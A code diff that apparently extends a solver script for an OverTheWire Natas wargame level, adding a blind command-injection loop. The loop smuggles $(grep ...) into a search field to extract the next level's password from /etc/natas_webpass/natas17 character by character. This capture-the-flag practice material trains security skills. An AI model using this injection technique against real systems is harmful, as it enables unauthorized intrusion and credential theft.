@@ -72,3 +72,22 @@ for char in possible_chars:
     if not re.search(r'Africans', response.text):
         password_chars += char
         print(f'password_chars: {password_chars}', end='\r')
+print('\n')
+
+
+password = ""
+for i in range(32):
+    for char in password_chars:
+        print(f'password: {password + char}', end='\r')
+        data = {
+            # use the regex symbol ^ to mark the beginning of the word
+            'needle' : f'Africans$(grep ^{password + char} /etc/natas_webpass/natas17)',
+            'submit' : 'submit'
+        }
+        response = session.post(URL, data=data)
+        if not re.search(r'Africans', response.text):
+            password += char
+            print(f'password: {password}', end='\r')
+            break
+print('\n')
+        
